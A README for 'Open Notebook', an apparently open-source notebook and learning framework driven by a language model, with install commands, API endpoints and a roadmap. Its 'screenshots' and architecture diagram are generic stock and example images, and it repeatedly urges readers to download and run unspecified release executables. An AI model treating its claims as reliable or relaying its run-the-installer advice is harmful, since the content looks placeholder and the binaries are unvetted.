# Open Notebook — Flexible Open-Source Notebook LM for Learning

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/ahmed-altijani/open-notebook/releases)

![Notebook banner](https://images.unsplash.com/photo-1525373693036-012d6dcdab0a?auto=format&fit=crop&w=1600&q=60)

Tags: 
[assistant] [learning] [note-taking] [notebook] [notes-app] [self-learning]

Brief
- Open Notebook is an open source Notebook-language-model (LM) framework designed for note-taking, iterated learning, and personal research workflows.  
- The project blends a lightweight local runtime, a modular plugin system, and a web-based notebook UI.  
- Use it for building assistant agents, personal knowledge systems, study journals, and research logs.

Why this repo matters 📒🧠
- It merges a standard notebook interface with an LM-driven workflow.  
- It supports structured notes, task prompts, retrieval-augmented context, and programmable steps.  
- It aims to make iterative learning measurable and reproducible.

Key features ✨
- Notebook-style cells: text, code, and prompt cells with versioned history.  
- Local-first runtime with optional cloud sync.  
- Plugin system for model adapters, vector stores, and integrations (e.g., Git, Obsidian, Zotero).  
- Fine-grained export: markdown, HTML, PDF, and structured JSON for analysis.  
- Task automations: recurring study prompts, spaced repetition integration, and evaluation hooks.  
- Access control for shared notebooks and audit trails for changes.  
- CLI and REST API for automation and CI pipelines.

Core concepts
- Notebook: a document composed of ordered cells. Cells can hold prompts, notes, or code.  
- Session: a sequence of model interactions and metadata. Sessions track prompts, responses, and evaluation.  
- Adapter: a pluggable connector for language models or retrievers.  
- Store: a vector or key-value store for context retrieval and indexing.  
- Hook: small functions executed at cell lifecycle events (before-run, after-run, on-save).

Table of contents
- Features
- Examples and demos
- Quick start
- Releases and download
- Install from source
- Configuration
- Usage patterns
- API and CLI
- Architecture
- Contributing
- Tests and CI
- Roadmap
- License and attribution

Examples and demos 🧩
- Study journal: create a daily study notebook that generates practice questions, stores answers, and scores recall over time.  
- Research log: keep a record of experiments, datasets, and reproducible steps. The system captures provenance for each result.  
- Teaching assistant: craft lesson plans that expand into exercises and auto-generate rubrics.  
- Personal knowledge base: index notes and add retrieval triggers inside living notebooks.

Quick start (most common path)
1. Clone the repo:
   git clone https://github.com/ahmed-altijani/open-notebook.git
2. Enter the folder:
   cd open-notebook
3. Install dependencies:
   - Python backend: pip install -r requirements.txt
   - Frontend: cd web && npm install
4. Run the dev server:
   - Backend: python -m open_notebook.server
   - Frontend: npm start
5. Open the UI at http://localhost:3000 and create your first notebook.

Releases and download ⬇️
- Download the release asset from https://github.com/ahmed-altijani/open-notebook/releases and run the provided executable or installer for your platform. The release page includes binary builds, Docker images, and archive packages.  
- Example: if you download a package named open-notebook-linux.tar.gz, extract it and run the included start script:
  tar -xzf open-notebook-linux.tar.gz
  ./open-notebook/start.sh
- The Releases page holds stable builds and tagged version notes. Visit https://github.com/ahmed-altijani/open-notebook/releases to pick the file that fits your system.

Install from source (detailed)
- Backend
  1. Create a virtual environment: python -m venv .venv
  2. Activate: source .venv/bin/activate (macOS/Linux) or .venv\Scripts\activate (Windows)
  3. Install: pip install -r requirements.txt
  4. Apply migrations: python -m open_notebook.db migrate
  5. Start: python -m open_notebook.server --host 0.0.0.0 --port 8080
- Frontend
  1. cd web
  2. npm ci
  3. npm run build (for production) or npm run dev (for development)
- Docker
  - Build:
    docker build -t open-notebook:latest .
  - Run:
    docker run -p 8080:8080 open-notebook:latest

Configuration
- Config file: config.yml in the repo root or ~/.open-notebook/config.yml  
- Key settings:
  - server.port: port number for backend
  - storage.path: path for notebook storage
  - models.adapters: map of adapter names to endpoints/keys
  - auth.enabled: true/false
  - sync.remote: optional remote URL for sync service
- Environment variables override config keys. Use OPEN_NOTEBOOK__SERVER__PORT=8080 style names.

Usage patterns
- Prompt-driven flow:
  - Create a prompt cell with a task directive and context blocks.
  - Attach evaluators that score output against gold examples.
- Repetitive study flow:
  - Tag notes with #spaced-rep and set next-review date.
  - System queues items and generates flash prompts the next review day.
- Automation:
  - Use the CLI to run headless notebooks. Schedule via cron or GitHub Actions.

API and CLI
- REST endpoints
  - GET /api/v1/notebooks — list notebooks
  - POST /api/v1/notebooks — create a notebook
  - POST /api/v1/notebooks/{id}/run — run a notebook or cell
  - GET /api/v1/sessions/{id} — retrieve session details
- CLI
  - onb init [name] — create a notebook
  - onb run [notebook] — execute cells in order
  - onb export [notebook] --format md|html|pdf|json
  - onb plugin install [adapter-name]

Architecture diagram
![Architecture](https://upload.wikimedia.org/wikipedia/commons/0/0b/Software_architecture_diagram_example.png)

Adapters and plugins
- Model adapters: OpenAI, Local Llama, Anthropic, or any HTTP-serving model. Implement the adapter interface in adapters/{name}.  
- Store plugins: vector-db connectors for FAISS, Weaviate, Pinecone.  
- Integrations: link to file systems, Obsidian vaults, Git repos, or scholarship tools like Zotero.

Data format
- Notebook file (.onb): JSON schema with cells, metadata, and version history.  
- Export JSON: includes full session logs and evaluation metadata for downstream analysis.

Security and privacy
- Local mode stores data on disk by default.  
- Use encryption for storage at rest if you work with sensitive data.  
- Configure API keys in environment variables and avoid committing them to Git.

Testing and CI
- Unit tests: pytest tests/unit  
- Integration tests: pytest tests/integration (requires a local or test adapter)  
- CI pipeline runs on push to main and PR. See .github/workflows for details.

Performance tips
- Use chunked retrieval for large documents.  
- Cache embeddings for frequent queries.  
- Limit model context by summarizing older cells and storing summaries.

Developer guide
- Code layout
  - open_notebook/ — backend code (API, models, storage)
  - web/ — frontend SPA (React + TypeScript)
  - adapters/ — model and store adapters
  - scripts/ — helper scripts and dev tools
- Tests
  - Place unit tests next to modules under tests/.  
  - Write adapter mocks for API-level tests.
- Style
  - Python: follow Black and isort.  
  - JS/TS: follow ESLint and Prettier rules in web/.

Contributing 🤝
- Open an issue describing a bug or feature idea.  
- Fork the repo, create a feature branch, and open a pull request.  
- Include tests for new features and keep changes scoped to one idea per PR.  
- Follow the commit message format: short subject, blank line, body with rationale.

Roadmap
- Plugin marketplace for community adapters.  
- Native mobile app for offline review and capture.  
- More evaluation hooks and grading templates for learning metrics.  
- Two-way sync adapters for Obsidian and Zotero with conflict resolution.

Changelog and releases
- See the Releases section for versioned builds, change logs, and prebuilt assets. Download the appropriate file from https://github.com/ahmed-altijani/open-notebook/releases and run the provided installer or script for your platform.

Acknowledgments and resources
- Inspirations: Jupyter, Obsidian, and iterative learning research.  
- Images: Unsplash and Wikimedia Commons for visuals.  
- Community: contributors and early adopters who tested adapters and workflows.

License
- MIT License. See LICENSE file for full terms.

Contact
- Open issues for bugs, feature requests, or discussion.  
- Use pull requests for code contributions.

Badges
[![Topics](https://img.shields.io/badge/topics-assistant%2Clearning%2Cnote--taking%2Cnotebook%2Cnotes--app%2Cself--learning-lightgrey)](https://github.com/ahmed-altijani/open-notebook)

Screenshots
- Notebook editor
  ![Editor screenshot](https://images.unsplash.com/photo-1518665756310-9c0fdb8a3d3d?auto=format&fit=crop&w=1200&q=60)
- Session view
  ![Session screenshot](https://images.unsplash.com/photo-1526662094047-9a9e9f1d0f7b?auto=format&fit=crop&w=1200&q=60)